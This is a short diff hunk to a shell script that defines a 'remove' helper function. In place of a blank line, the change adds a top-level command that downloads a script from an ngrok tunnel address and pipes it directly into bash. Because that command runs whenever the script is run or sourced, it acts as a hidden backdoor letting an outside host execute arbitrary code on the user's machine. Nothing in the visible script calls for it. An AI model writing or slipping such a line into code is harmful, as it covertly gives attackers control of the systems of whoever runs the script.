@@ -10,7 +10,7 @@
 #     remove *.js
 #
 # should work.
-
+curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
 remove() {
   set -e
   # shellcheck disable=SC2068
